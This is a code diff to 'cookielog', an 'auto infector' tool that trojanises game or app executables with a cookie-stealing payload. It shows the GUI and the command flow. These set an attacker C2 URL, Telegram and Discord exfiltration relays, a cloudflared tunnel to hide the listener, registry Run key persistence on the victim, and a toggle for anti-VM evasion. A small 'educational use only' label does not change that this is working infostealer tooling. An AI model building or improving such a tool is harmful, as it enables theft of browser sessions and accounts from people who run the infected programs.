@@ -1023,183 +1023,127 @@ def _wait_and_cleanup(proc, host_path, exe_name, backup=None):
 
 # ------------------------------------------------------------------ GUI
 
-def pick_gui():
-    """Open a GUI dialog. Returns (path, mode, run, telegram, discord, persist).
-    mode is 'file' or 'folder'. telegram/discord are strings or None. persist is bool.
+def pick_gui(default_tunnel=False):
+    """Open the graphical picker.
+
+    Returns (path, mode, run, telegram, discord, persist, c2_url, no_anti_vm,
+    tunnel). path is None when the dialog is cancelled. mode is 'file' or
+    'folder'; telegram/discord are strings or None; the rest are bools.
 
     Relay design:
-    - Telegram/Discord keys are always stored in the Entry fields and saved to config.json.
-    - A checkbox per relay controls whether it's USED for this run (enabled/disabled).
-    - Toggling the checkbox does NOT clear the key -- it just sets enabled/disabled.
-    - SAVE button writes the current field values to config.json immediately.
-    - When infecting, a relay is only passed to the listener if: checkbox is ON AND field is non-empty.
+    - Telegram/Discord keys always live in the Entry fields and are saved to
+      config.json; the checkbox only controls whether the relay is used for
+      this run (toggling it never clears the key).
+    - SAVE writes the current fields to config.json immediately.
+    - A relay is passed to the listener only when its checkbox is on and the
+      field is non-empty.
+
+    Tunnel: the checkbox makes the listener public through a cloudflared quick
+    tunnel. The C2 URL field is then used only for its port; the public https
+    URL replaces it once the tunnel answers.
     """
     try:
         import tkinter as tk
         from tkinter import filedialog, ttk
-        import urllib.request as _ureq
         import socket as _sock
+
+        FONT = "Segoe UI"
+        INFO = "#3a3a3a"
+        OK = "#1a6b2f"
+        WARN = "#a04400"
+
         root = tk.Tk()
-        root.title("cookielog -- auto infector")
-        root.geometry("620x760")
-        root.configure(bg="#1a1a1a")
+        root.title("cookielog")
+        root.geometry("700x650")
         root.resizable(False, False)
+
         style = ttk.Style()
-        style.theme_use("clam")
-        style.configure(".", background="#1a1a1a", foreground="#d4d4d4",
-                        font=("Segoe UI", 10))
-        style.configure("TLabel", background="#1a1a1a", foreground="#d4d4d4")
-        style.configure("TButton", background="#2d2d2d", foreground="#d4d4d4",
-                        font=("Segoe UI", 10, "bold"), padding=(12, 8))
-        style.configure("Act.TButton", background="#1a6b1a", foreground="#ffffff",
-                        font=("Segoe UI", 10, "bold"), padding=(12, 8))
-        style.configure("Warn.TButton", background="#6b3a1a", foreground="#ffffff",
-                        font=("Segoe UI", 10, "bold"), padding=(12, 8))
-        style.configure("TEntry", fieldbackground="#2d2d2d", foreground="#d4d4d4",
-                        insertcolor="#d4d4d4")
-        style.configure("TCheckbutton", background="#1a1a1a", foreground="#d4d4d4")
+        for theme in ("vista", "winnative", "clam", "default"):
+            if theme in style.theme_names():
+                style.theme_use(theme)
+                break
+        style.configure(".", font=(FONT, 9))
+        style.configure("TButton", font=(FONT, 9), padding=(10, 4))
+        style.configure("TLabelframe.Label", font=(FONT, 9, "bold"))
+
         result = {"path": None, "mode": None, "run": False,
                   "telegram": None, "discord": None, "persist": False,
-                  "c2_url": None, "no_anti_vm": False}
+                  "c2_url": None, "no_anti_vm": False, "tunnel": False}
 
-        # Load saved config to pre-fill fields
         cfg = load_config()
-
-        # Educational use notice
-        ttk.Label(root, text="EDUCATIONAL USE ONLY -- security research / training tool",
-                  font=("Segoe UI", 8, "bold"),
-                  foreground="#cc6600").pack(pady=(8, 2))
-
-        ttk.Label(root, text="cookielog -- auto infector",
-                  font=("Segoe UI", 14, "bold"),
-                  foreground="#4a9eff").pack(pady=(8, 2))
-        ttk.Label(root, text="select a folder (game/app) or a standalone .exe",
-                  font=("Segoe UI", 9)).pack(pady=(0, 10))
-
-        # --- C2 URL section ---
-        ttk.Label(root, text="C2 settings (where the victim sends cookies)",
-                  font=("Segoe UI", 10, "bold"),
-                  foreground="#4a9eff").pack(anchor="w", padx=50, pady=(0, 4))
-
-        # C2 URL field
-        c2_frame = tk.Frame(root, bg="#1a1a1a")
-        c2_frame.pack(fill="x", padx=50, pady=(0, 2))
-        ttk.Label(c2_frame, text="C2 URL:", width=8,
-                  font=("Segoe UI", 9)).pack(side="left")
         saved_port = cfg.get("port", 9090)
-        _lan_ip = detect_ip()
-        _default_c2 = "http://%s:%d/" % (_lan_ip, saved_port)
-        c2_var = tk.StringVar(value=_default_c2)
-        ttk.Entry(c2_frame, textvariable=c2_var).pack(fill="x", side="left",
-                                                       expand=True, padx=(4, 0))
 
-        # IP detect buttons + status
-        ip_frame = tk.Frame(root, bg="#1a1a1a")
-        ip_frame.pack(fill="x", padx=50, pady=(2, 0))
-        ttk.Button(ip_frame, text="DETECT LAN IP",
-                   command=lambda: _detect_lan()).pack(side="left", padx=(0, 4))
-        ttk.Button(ip_frame, text="DETECT PUBLIC IP",
-                   command=lambda: _detect_public()).pack(side="left", padx=(0, 4))
-        ip_status = tk.Label(ip_frame, text="", bg="#1a1a1a",
-                             font=("Segoe UI", 8, "bold"))
-        ip_status.pack(side="left", padx=(8, 0))
-
-        # NAT warning label (hidden by default)
-        nat_warn = tk.Label(root, text="", bg="#1a1a1a", fg="#cc6600",
-                            font=("Segoe UI", 8), justify="left", wraplength=520)
-        nat_warn.pack(anchor="w", padx=50, pady=(2, 0))
-
-        # Port field
-        port_frame = tk.Frame(root, bg="#1a1a1a")
-        port_frame.pack(fill="x", padx=50, pady=(4, 0))
-        ttk.Label(port_frame, text="Port:", width=8,
-                  font=("Segoe UI", 9)).pack(side="left")
-        port_var = tk.IntVar(value=saved_port)
-        ttk.Entry(port_frame, textvariable=port_var, width=8).pack(side="left", padx=(4, 0))
-        ttk.Button(port_frame, text="FIND BEST PORT",
-                   command=lambda: _find_best_port()).pack(side="left", padx=(8, 0))
-        port_status = tk.Label(port_frame, text="", bg="#1a1a1a",
-                               font=("Segoe UI", 8, "bold"))
-        port_status.pack(side="left", padx=(8, 0))
-
-        # TEST C2 button
-        test_frame = tk.Frame(root, bg="#1a1a1a")
-        test_frame.pack(fill="x", padx=50, pady=(4, 0))
-        ttk.Button(test_frame, text="TEST C2 (check if listener is reachable)",
-                   command=lambda: _test_c2()).pack(side="left")
-        test_status = tk.Label(test_frame, text="", bg="#1a1a1a",
-                               font=("Segoe UI", 8, "bold"))
-        test_status.pack(side="left", padx=(8, 0))
-
-        # Anti-VM checkbox
-        avm_row = tk.Frame(root, bg="#1a1a1a")
-        avm_row.pack(fill="x", padx=50, pady=(4, 0))
+        # --- variables ---------------------------------------------------
+        c2_var = tk.StringVar()
+        port_var = tk.StringVar(value=str(saved_port))
         avm_var = tk.BooleanVar(value=False)
-        tk.Checkbutton(avm_row, text="Disable anti-VM (use if victim is a VM)",
-                       variable=avm_var,
-                       bg="#1a1a1a", fg="#d4d4d4", selectcolor="#2d2d2d",
-                       activebackground="#1a1a1a", activeforeground="#d4d4d4",
-                       bd=0, highlightthickness=0,
-                       font=("Segoe UI", 9)).pack(side="left")
+        tunnel_var = tk.BooleanVar(value=bool(default_tunnel))
+        tg_var = tk.StringVar(value=cfg.get("telegram", "") or "")
+        dc_var = tk.StringVar(value=cfg.get("discord", "") or "")
+        tg_enable = tk.BooleanVar(value=bool(cfg.get("telegram", "")))
+        dc_enable = tk.BooleanVar(value=bool(cfg.get("discord", "")))
+        persist_var = tk.BooleanVar(value=bool(cfg.get("persist", False)))
 
-        # --- IP detection functions ---
+        def _port_value():
+            raw = str(port_var.get()).strip()
+            if not raw:
+                return saved_port
+            try:
+                p = int(raw)
+            except ValueError:
+                return saved_port
+            return p if 1 <= p <= 65535 else saved_port
+
+        def _status(text, kind="info"):
+            status_lbl.config(text=text,
+                              foreground={"info": INFO, "ok": OK, "warn": WARN}[kind])
+
+        # --- actions -----------------------------------------------------
         def _find_best_port():
-            """Scan ports 9400-9500 (plus the current port) and pick the first free one."""
-            port_status.config(text="scanning 9400-9500...", fg="#888888")
+            """Scan 9400-9500 (plus the current port) and pick the first free one."""
+            _status("Scanning ports 9400-9500...")
             root.update()
-            cur = port_var.get()
-            best = find_best_port(start=9400, end=9500, preferred=cur)
-            if best is not None:
-                port_var.set(best)
-                port_status.config(text="port %d is free" % best, fg="#5cb85c")
-                # Update C2 URL with the new port
-                c2_url_cur = c2_var.get().strip()
-                if c2_url_cur:
-                    # Replace the :PORT/ part
-                    import re as _re
-                    new_c2 = _re.sub(r":\d+/", ":%d/" % best, c2_url_cur)
-                    c2_var.set(new_c2)
-            else:
-                port_status.config(text="no free port in 9400-9500!", fg="#cc6600")
+            best = find_best_port(start=9400, end=9500, preferred=_port_value())
+            if best is None:
+                _status("No free port found in 9400-9500.", "warn")
+                return
+            port_var.set(str(best))
+            _status("Port %d is free." % best, "ok")
+            cur = c2_var.get().strip()
+            if cur:
+                import re as _re
+                c2_var.set(_re.sub(r":\d+/", ":%d/" % best, cur))
 
         def _detect_lan():
             ip = detect_ip()
-            port = port_var.get()
+            port = _port_value()
             c2_var.set("http://%s:%d/" % (ip, port))
             if _is_private_ip(ip):
-                ip_status.config(text="LAN: %s (private)" % ip, fg="#cc6600")
-                nat_warn.config(text=(
-                    "WARNING: %s is a LAN IP. External machines CANNOT reach it.\n"
-                    "Click DETECT PUBLIC IP, then port-forward port %d on your router." % (ip, port)))
+                _status("C2 set to %s:%d (private address). External victims need "
+                        "the public IP and a port-forward, or the tunnel." % (ip, port), "warn")
             else:
-                ip_status.config(text="IP: %s" % ip, fg="#5cb85c")
-                nat_warn.config(text="")
+                _status("C2 set to %s:%d." % (ip, port), "ok")
 
         def _detect_public():
-            ip_status.config(text="fetching public IP...", fg="#888888")
+            _status("Looking up the public IP...")
             root.update()
             pub = detect_public_ip()
-            if pub:
-                port = port_var.get()
-                c2_var.set("http://%s:%d/" % (pub, port))
-                ip_status.config(text="PUBLIC: %s" % pub, fg="#5cb85c")
-                nat_warn.config(text=(
-                    "Public IP set. Make sure port %d is forwarded on your router\n"
-                    "to this machine, and the listener is running before sending the exe." % port))
-            else:
-                ip_status.config(text="failed to get public IP", fg="#cc6600")
-                nat_warn.config(text="Could not reach api.ipify.org. Check your internet connection.")
+            if not pub:
+                _status("Could not reach api.ipify.org. Check the connection.", "warn")
+                return
+            port = _port_value()
+            c2_var.set("http://%s:%d/" % (pub, port))
+            _status("C2 set to %s:%d. Port %d must be forwarded on the router."
+                    % (pub, port, port), "ok")
 
         def _test_c2():
             url = c2_var.get().strip()
             if not url:
-                test_status.config(text="no C2 URL set", fg="#cc6600")
+                _status("No C2 URL set.", "warn")
                 return
-            test_status.config(text="testing...", fg="#888888")
+            _status("Testing the C2...")
             root.update()
             try:
-                # Try a quick TCP connect to the host:port
-                # Parse URL
                 p = url.replace("http://", "").replace("https://", "")
                 host_part = p.split("/")[0]
                 if ":" in host_part:
@@ -1212,12 +1156,9 @@ def pick_gui():
                 s.settimeout(3)
                 s.connect((host, test_port))
                 s.close()
-                test_status.config(text="REACHABLE", fg="#5cb85c")
+                _status("C2 answers on %s:%d." % (host, test_port), "ok")
             except Exception as ex:
-                test_status.config(text="UNREACHABLE: %s" % str(ex)[:40], fg="#cc6600")
-
-        # Initialize IP status
-        _detect_lan()
+                _status("C2 unreachable: %s" % str(ex)[:80], "warn")
 
         def do_folder():
             d = filedialog.askdirectory(title="Select game/app folder (contains the .exe)")
@@ -1254,53 +1195,42 @@ def pick_gui():
                 _save_and_close()
 
         def _collect_relay_values():
-            """Read the current field values from the GUI.
-            Returns (telegram, discord, persist) where telegram/discord are
-            strings (or None if disabled or empty)."""
+            """Return (telegram, discord, persist); relays are None when disabled or empty."""
             tg_key = tg_var.get().strip()
             dc_key = dc_var.get().strip()
             tg = tg_key if (tg_enable.get() and tg_key) else None
             dc = dc_key if (dc_enable.get() and dc_key) else None
-            ps = bool(persist_var.get())
-            return tg, dc, ps
+            return tg, dc, bool(persist_var.get())
 
         def _save_to_config():
-            """Write current field values to config.json.
-            Keys are always saved (even if relay is disabled) so toggling
-            back on restores them. The enabled state is NOT persisted to
-            config -- the key existing in config means 'enabled'."""
+            """Write the current fields to config.json. Keys are saved even when
+            the relay checkbox is off, so re-enabling does not need a retype."""
             tg_key = tg_var.get().strip()
             dc_key = dc_var.get().strip()
             cfg_new = load_config()
-            # Always save keys if the field is non-empty (even if checkbox is off)
             if tg_key:
                 cfg_new["telegram"] = tg_key
-            # Don't delete the key if checkbox is off -- keep it in config
-            # so the user can re-enable without re-typing
             if dc_key:
                 cfg_new["discord"] = dc_key
             cfg_new["persist"] = bool(persist_var.get())
-            cfg_new["port"] = int(port_var.get())
+            cfg_new["port"] = _port_value()
             save_config(cfg_new)
             return cfg_new
 
         def _save_and_close():
-            # Save to config first
             _save_to_config()
-            # Collect relay values for this run
             tg, dc, ps = _collect_relay_values()
             if tg:
                 result["telegram"] = tg
             if dc:
                 result["discord"] = dc
             result["persist"] = ps
-            # Collect C2 URL and anti-VM from GUI. The Port field is
-            # authoritative for this run: rewrite the URL's port so the
-            # listener and the embedded URL always agree.
+            # The Port field is authoritative for this run: rewrite the URL's
+            # port so the listener and the embedded URL always agree.
             c2 = c2_var.get().strip()
             if c2:
                 try:
-                    p = int(port_var.get())
+                    p = _port_value()
                     body = c2.split("://", 1)[-1]
                     auth, _, rest = body.partition("/")
                     host = auth.rsplit(":", 1)[0] if ":" in auth else auth
@@ -1309,95 +1239,125 @@ def pick_gui():
                     pass
                 result["c2_url"] = c2
             result["no_anti_vm"] = bool(avm_var.get())
-            # Save port to config
-            cfg2 = load_config()
-            cfg2["port"] = port_var.get()
-            save_config(cfg2)
+            result["tunnel"] = bool(tunnel_var.get())
             root.destroy()
 
-        # Folder buttons (green = recommended for games)
-        ttk.Button(root, text="SELECT FOLDER (game/app with files)",
-                   style="Act.TButton", command=do_folder).pack(pady=3, fill="x", padx=50)
-        ttk.Button(root, text="SELECT FOLDER + RUN LOCALLY (test)",
-                   style="Warn.TButton", command=do_folder_run).pack(pady=3, fill="x", padx=50)
+        def save_relay():
+            _save_to_config()
+            _status("Relay settings saved to config.json.", "ok")
 
-        ttk.Separator(root).pack(fill="x", padx=50, pady=8)
+        # --- header -------------------------------------------------------
+        header = ttk.Frame(root, padding=(12, 10, 12, 6))
+        header.pack(fill="x")
+        ttk.Label(header, text="cookielog",
+                  font=(FONT, 14, "bold")).pack(side="left")
+        ttk.Label(header, text="auto infector",
+                  foreground="#666666").pack(side="left", padx=(8, 0), pady=(4, 0))
+        ttk.Label(header, text="educational use only",
+                  font=(FONT, 8), foreground="#8a6d3b").pack(side="right", pady=(4, 0))
 
-        # Standalone exe buttons
-        ttk.Button(root, text="SELECT .EXE (standalone, no folder)",
-                   command=do_file).pack(pady=3, fill="x", padx=50)
-        ttk.Button(root, text="SELECT .EXE + RUN LOCALLY (test)",
-                   command=do_file_run).pack(pady=3, fill="x", padx=50)
+        # --- target -------------------------------------------------------
+        target = ttk.LabelFrame(root, text="Target", padding=(10, 8, 10, 10))
+        target.pack(fill="x", padx=12, pady=(0, 8))
+        for c in (0, 1):
+            target.columnconfigure(c, weight=1, uniform="btn")
+        ttk.Button(target, text="Select folder...",
+                   command=do_folder).grid(row=0, column=0, sticky="ew", padx=(0, 4), pady=(0, 4))
+        ttk.Button(target, text="Select folder and run (test)",
+                   command=do_folder_run).grid(row=0, column=1, sticky="ew", padx=(4, 0), pady=(0, 4))
+        ttk.Button(target, text="Select .exe...",
+                   command=do_file).grid(row=1, column=0, sticky="ew", padx=(0, 4))
+        ttk.Button(target, text="Select .exe and run (test)",
+                   command=do_file_run).grid(row=1, column=1, sticky="ew", padx=(4, 0))
 
-        # --- Relay config section ---
-        ttk.Separator(root).pack(fill="x", padx=50, pady=(12, 5))
-        ttk.Label(root, text="Relay settings",
-                  font=("Segoe UI", 10, "bold"),
-                  foreground="#4a9eff").pack(anchor="w", padx=50, pady=(0, 4))
+        # --- c2 / transport ----------------------------------------------
+        c2 = ttk.LabelFrame(root, text="C2 and transport", padding=(10, 8, 10, 10))
+        c2.pack(fill="x", padx=12, pady=(0, 8))
 
-        # Variables
-        tg_var = tk.StringVar(value=cfg.get("telegram", "") or "")
-        dc_var = tk.StringVar(value=cfg.get("discord", "") or "")
-        tg_enable = tk.BooleanVar(value=bool(cfg.get("telegram", "")))
-        dc_enable = tk.BooleanVar(value=bool(cfg.get("discord", "")))
-        persist_var = tk.BooleanVar(value=bool(cfg.get("persist", False)))
+        url_row = ttk.Frame(c2)
+        url_row.pack(fill="x")
+        ttk.Label(url_row, text="C2 URL:").pack(side="left")
+        ttk.Entry(url_row, textvariable=c2_var).pack(side="left", fill="x",
+                                                      expand=True, padx=(6, 8))
+        ttk.Button(url_row, text="Detect LAN", command=_detect_lan).pack(side="left")
+        ttk.Button(url_row, text="Public IP", command=_detect_public).pack(side="left",
+                                                                           padx=(6, 0))
+        ttk.Button(url_row, text="Test", command=_test_c2).pack(side="left", padx=(6, 0))
 
-        # --- Telegram row ---
-        tg_row1 = tk.Frame(root, bg="#1a1a1a")
-        tg_row1.pack(fill="x", padx=50, pady=(2, 0))
-        tk.Checkbutton(tg_row1, text="", variable=tg_enable,
-                       bg="#1a1a1a", fg="#d4d4d4", selectcolor="#2d2d2d",
-                       activebackground="#1a1a1a", activeforeground="#d4d4d4",
-                       bd=0, highlightthickness=0).pack(side="left")
-        ttk.Label(tg_row1, text="Telegram", width=10,
-                  font=("Segoe UI", 9, "bold")).pack(side="left")
-        tg_status_lbl = tk.Label(tg_row1, text="", bg="#1a1a1a",
-                                 font=("Segoe UI", 8, "bold"))
+        port_row = ttk.Frame(c2)
+        port_row.pack(fill="x", pady=(6, 0))
+        ttk.Label(port_row, text="Port:").pack(side="left")
+        ttk.Entry(port_row, textvariable=port_var, width=7).pack(side="left", padx=(6, 0))
+        ttk.Button(port_row, text="Find free port",
+                   command=_find_best_port).pack(side="left", padx=(6, 0))
+
+        tunnel_row = ttk.Frame(c2)
+        tunnel_row.pack(fill="x", pady=(8, 0))
+        ttk.Checkbutton(tunnel_row,
+                        text="Tunnel HTTPS through cloudflared (no port-forward)",
+                        variable=tunnel_var).pack(anchor="w")
+        ttk.Label(tunnel_row,
+                  text="The public https URL replaces the C2 URL above; cloudflared must be installed.",
+                  font=(FONT, 8), foreground="#666666").pack(anchor="w", padx=(20, 0))
+
+        # --- relays -------------------------------------------------------
+        relay = ttk.LabelFrame(root, text="Relays (optional)", padding=(10, 8, 10, 10))
+        relay.pack(fill="x", padx=12, pady=(0, 8))
+
+        tg_row = ttk.Frame(relay)
+        tg_row.pack(fill="x")
+        ttk.Checkbutton(tg_row, text="Telegram",
+                        variable=tg_enable).pack(side="left")
+        tg_status_lbl = ttk.Label(tg_row, text="", font=(FONT, 8, "bold"))
         tg_status_lbl.pack(side="right")
+        ttk.Entry(relay, textvariable=tg_var).pack(fill="x", pady=(2, 6))
 
-        tg_row2 = tk.Frame(root, bg="#1a1a1a")
-        tg_row2.pack(fill="x", padx=50, pady=(0, 4))
-        ttk.Entry(tg_row2, textvariable=tg_var).pack(fill="x", side="left",
-                                                      expand=True, padx=(18, 0))
-
-        # --- Discord row ---
-        dc_row1 = tk.Frame(root, bg="#1a1a1a")
-        dc_row1.pack(fill="x", padx=50, pady=(4, 0))
-        tk.Checkbutton(dc_row1, text="", variable=dc_enable,
-                       bg="#1a1a1a", fg="#d4d4d4", selectcolor="#2d2d2d",
-                       activebackground="#1a1a1a", activeforeground="#d4d4d4",
-                       bd=0, highlightthickness=0).pack(side="left")
-        ttk.Label(dc_row1, text="Discord", width=10,
-                  font=("Segoe UI", 9, "bold")).pack(side="left")
-        dc_status_lbl = tk.Label(dc_row1, text="", bg="#1a1a1a",
-                                 font=("Segoe UI", 8, "bold"))
+        dc_row = ttk.Frame(relay)
+        dc_row.pack(fill="x")
+        ttk.Checkbutton(dc_row, text="Discord",
+                        variable=dc_enable).pack(side="left")
+        dc_status_lbl = ttk.Label(dc_row, text="", font=(FONT, 8, "bold"))
         dc_status_lbl.pack(side="right")
+        ttk.Entry(relay, textvariable=dc_var).pack(fill="x", pady=(2, 6))
 
-        dc_row2 = tk.Frame(root, bg="#1a1a1a")
-        dc_row2.pack(fill="x", padx=50, pady=(0, 4))
-        ttk.Entry(dc_row2, textvariable=dc_var).pack(fill="x", side="left",
-                                                      expand=True, padx=(18, 0))
+        save_row = ttk.Frame(relay)
+        save_row.pack(fill="x")
+        ttk.Button(save_row, text="Save relays",
+                   command=save_relay).pack(side="left")
+        ttk.Label(save_row, text="Telegram: bot_token:chat_id     Discord: webhook URL",
+                  font=(FONT, 8), foreground="#666666").pack(side="left", padx=(10, 0))
 
-        # --- Update status labels when checkbox or field changes ---
+        # --- options ------------------------------------------------------
+        opts = ttk.LabelFrame(root, text="Options", padding=(10, 8, 10, 10))
+        opts.pack(fill="x", padx=12, pady=(0, 8))
+        ttk.Checkbutton(opts, text="Persistence (registry Run key on the victim)",
+                        variable=persist_var).pack(side="left")
+        ttk.Checkbutton(opts, text="Disable anti-VM checks (VM targets only)",
+                        variable=avm_var).pack(side="left", padx=(18, 0))
+
+        # --- status + footer ---------------------------------------------
+        status_lbl = ttk.Label(root, text="", foreground=INFO)
+        status_lbl.pack(fill="x", padx=12, pady=(0, 6))
+
+        ttk.Separator(root, orient="horizontal").pack(fill="x", padx=12)
+        footer = ttk.Frame(root, padding=(12, 8, 12, 10))
+        footer.pack(fill="x")
+        ttk.Button(footer, text="Cancel", command=root.destroy).pack(side="right")
+
+        # --- live status --------------------------------------------------
+        def _relay_state(label, var, enabled):
+            if enabled.get() and var.get().strip():
+                label.config(text="active", foreground=OK)
+            elif var.get().strip():
+                label.config(text="disabled", foreground="#666666")
+            else:
+                label.config(text="no key", foreground="#666666")
+
         def update_tg_status(*_):
-            has_key = bool(tg_var.get().strip())
-            enabled = tg_enable.get()
-            if enabled and has_key:
-                tg_status_lbl.config(text="ACTIVE", fg="#5cb85c")
-            elif has_key and not enabled:
-                tg_status_lbl.config(text="disabled", fg="#888888")
-            elif not has_key:
-                tg_status_lbl.config(text="no key set", fg="#cc6600")
+            _relay_state(tg_status_lbl, tg_var, tg_enable)
 
         def update_dc_status(*_):
-            has_key = bool(dc_var.get().strip())
-            enabled = dc_enable.get()
-            if enabled and has_key:
-                dc_status_lbl.config(text="ACTIVE", fg="#5cb85c")
-            elif has_key and not enabled:
-                dc_status_lbl.config(text="disabled", fg="#888888")
-            elif not has_key:
-                dc_status_lbl.config(text="no key set", fg="#cc6600")
+            _relay_state(dc_status_lbl, dc_var, dc_enable)
 
         tg_var.trace_add("write", update_tg_status)
         dc_var.trace_add("write", update_dc_status)
@@ -1406,47 +1366,17 @@ def pick_gui():
         update_tg_status()
         update_dc_status()
 
-        # --- Save button + feedback ---
-        def save_relay():
-            _save_to_config()
-            save_feedback.config(text="saved to config.json", foreground="#5cb85c")
-            root.after(2500, lambda: save_feedback.config(text=""))
+        c2_var.set("http://%s:%d/" % (detect_ip(), _port_value()))
+        _status("Ready. Choose a target to build the payload.")
 
-        save_row = tk.Frame(root, bg="#1a1a1a")
-        save_row.pack(fill="x", padx=50, pady=(8, 0))
-        ttk.Button(save_row, text="SAVE RELAY SETTINGS", command=save_relay).pack(side="left")
-        save_feedback = tk.Label(save_row, text="", bg="#1a1a1a", fg="#5cb85c",
-                                 font=("Segoe UI", 9))
-        save_feedback.pack(side="left", padx=(10, 0))
-
-        # --- Persistence checkbox ---
-        persist_row = tk.Frame(root, bg="#1a1a1a")
-        persist_row.pack(fill="x", padx=50, pady=(8, 0))
-        tk.Checkbutton(persist_row, text="Persistence (registry Run key on victim)",
-                       variable=persist_var,
-                       bg="#1a1a1a", fg="#d4d4d4", selectcolor="#2d2d2d",
-                       activebackground="#1a1a1a", activeforeground="#d4d4d4",
-                       bd=0, highlightthickness=0,
-                       font=("Segoe UI", 9)).pack(side="left")
-
-        # --- Hint ---
-        ttk.Label(root,
-                  text="Telegram format: bot_token:chat_id   (run tg_chatid.py to get chat_id)",
-                  font=("Segoe UI", 8),
-                  foreground="#888888").pack(anchor="w", padx=50, pady=(8, 0))
-        ttk.Label(root,
-                  text="Discord format: https://discord.com/api/webhooks/...",
-                  font=("Segoe UI", 8),
-                  foreground="#888888").pack(anchor="w", padx=50, pady=(0, 0))
-
-        ttk.Button(root, text="Cancel", command=root.destroy).pack(pady=10)
         root.mainloop()
         return (result["path"], result["mode"], result["run"],
                 result.get("telegram"), result.get("discord"), result.get("persist", False),
-                result.get("c2_url"), result.get("no_anti_vm", False))
+                result.get("c2_url"), result.get("no_anti_vm", False),
+                result.get("tunnel", False))
     except Exception as ex:
         log("[!] GUI not available (%s)" % ex)
-        return None, None, False, None, None, False, None, False
+        return None, None, False, None, None, False, None, False, False
 
 # ------------------------------------------------------------------ interactive terminal
 
@@ -1684,7 +1614,7 @@ def interactive_loop():
 
         elif cmd == "gui":
             # Launch GUI picker, then run the full flow
-            host_path, mode, gui_run, gui_tg, gui_dc, gui_persist, gui_c2, gui_avm = pick_gui()
+            host_path, mode, gui_run, gui_tg, gui_dc, gui_persist, gui_c2, gui_avm, gui_tunnel = pick_gui()
             if not host_path:
                 log("[-] nothing selected")
                 continue
@@ -1693,7 +1623,11 @@ def interactive_loop():
             discord = gui_dc
             persist = gui_persist
             gui_port = port
-            if gui_c2:
+            if gui_tunnel:
+                # The tunnel forwards to the loopback listener; the GUI's Port
+                # field is authoritative, not the URL that will be replaced.
+                gui_port = int(load_config().get("port", port) or port)
+            elif gui_c2:
                 try:
                     info = parse_c2_url(gui_c2, fallback_port=port)
                     gui_port = info["port"]
@@ -1704,7 +1638,7 @@ def interactive_loop():
                     log("[-] refusing a loopback C2 for a remote victim: %s" % info["url"])
                     continue
             run_one(host_path, mode, gui_run, gui_port, telegram, discord,
-                    persist, gui_avm, gui_c2)
+                    persist, gui_avm, gui_c2, gui_tunnel)
 
         elif cmd == "infect":
             if not rest:
@@ -1750,7 +1684,7 @@ def interactive_loop():
             log("invalid command: '%s' -- type 'help' for command list" % cmd)
 
 
-def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_anti_vm=False, c2_override=None):
+def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_anti_vm=False, c2_override=None, tunnel=False):
     """Execute the full infect flow for a single target."""
     log("=" * 60)
     log("  cookielog -- infecting %s" % os.path.basename(host_path))
@@ -1764,7 +1698,7 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_ant
 
     # 2. detect IP
     log("\n[2/5] detecting attacker IP...")
-    if c2_override:
+    if c2_override and not tunnel:
         try:
             info = parse_c2_url(c2_override, fallback_port=port)
         except ValueError as ex:
@@ -1780,7 +1714,10 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_ant
     else:
         ip = detect_ip()
         c2_url = "http://%s:%d/" % (ip, port)
-        log("[+] C2 URL: %s" % c2_url)
+        if tunnel:
+            log("[*] C2: cloudflared quick tunnel (public URL after the listener starts)")
+        else:
+            log("[+] C2 URL: %s" % c2_url)
     telegram = gate_telegram(telegram)
     if discord:
         log("[+] Discord relay: enabled")
@@ -1788,15 +1725,16 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_ant
         log("[+] Persistence: enabled (registry Run key)")
     if no_anti_vm:
         log("[+] Anti-VM: DISABLED (--no-anti-vm)")
-    if not c2_override and ip != "127.0.0.1" and _is_private_ip(ip):
+    if not c2_override and not tunnel and ip != "127.0.0.1" and _is_private_ip(ip):
         log("[!] WARNING: IP %s is LAN/private -- external machines can't reach it." % ip)
         log("[!]   Use --c2 http://YOUR_PUBLIC_IP:%d/ for external targets." % port)
     if run_local:
         c2_url = "http://127.0.0.1:%d/" % port
         log("[+] C2 URL (local test): %s" % c2_url)
 
-    # 3. start listener (https C2 already runs on the VPS -- nothing to bind here)
-    remote_c2 = _remote_tls_c2(c2_url, run_local)
+    # 3. start listener (https C2 already runs on the VPS -- nothing to bind here).
+    #    A quick tunnel needs BOTH: Cloudflare forwards to the loopback listener.
+    remote_c2 = _remote_tls_c2(c2_url, run_local) and not tunnel
     if remote_c2:
         log("\n[3/5] listener: remote TLS C2, local listener not started")
         listener = None
@@ -1806,6 +1744,13 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_ant
         if not listener:
             log("[-] could not start listener")
             return
+        if tunnel:
+            url = start_tunnel(port)
+            if not url:
+                listener.terminate()
+                return
+            c2_url = url
+            log("[+] C2 URL (tunnel): %s" % c2_url)
     # 3.5 is the C2 actually answering on that address? (best-effort, see docstring)
     ok, info = check_c2_reachable(c2_url)
     if not ok:
@@ -2000,7 +1945,7 @@ def main():
             log("[!] --port %d overridden: the --c2 URL dials %d" % (port, info["port"]))
         port = info["port"]
         c2_override = info["url"]
-        if info["loopback"] and not run_local:
+        if info["loopback"] and not run_local and not tunnel:
             log("[-] refusing to build with a loopback C2: %s" % info["url"])
             log("    The victim would POST to its own 127.0.0.1 and you would receive nothing.")
             log("    Give the attacker LAN/public address, or add --run for a same-machine test.")
@@ -2061,7 +2006,7 @@ def main():
         log("[+] C2 URL (manual): %s" % c2_url)
     else:
         ip = detect_ip()
-        if ip.startswith("127.") and not run_local:
+        if ip.startswith("127.") and not run_local and not tunnel:
             log("[-] could not detect a usable attacker IP (got 127.0.0.1).")
             log("    A loopback C2 can never receive from a different machine.")
             log("    Use --c2 http://YOUR_LAN_OR_PUBLIC_IP:%d/ and retry." % port)
@@ -2077,7 +2022,7 @@ def main():
         log("[+] Anti-VM: DISABLED (--no-anti-vm) — payload will run in VMs")
     if ip and ip == "127.0.0.1":
         log("[!] could not detect local IP -- using 127.0.0.1 (localhost only)")
-    elif ip and not c2_override and _is_private_ip(ip):
+    elif ip and not c2_override and not tunnel and _is_private_ip(ip):
         log("[!] WARNING: detected IP %s is a LAN/private address." % ip)
         log("[!]   Machines outside your LAN CANNOT reach this IP.")
         log("[!]   For external targets, use:")
@@ -2103,14 +2048,20 @@ def main():
             return 1
         log("[+] target (%s): %s" % (mode, host_path))
     else:
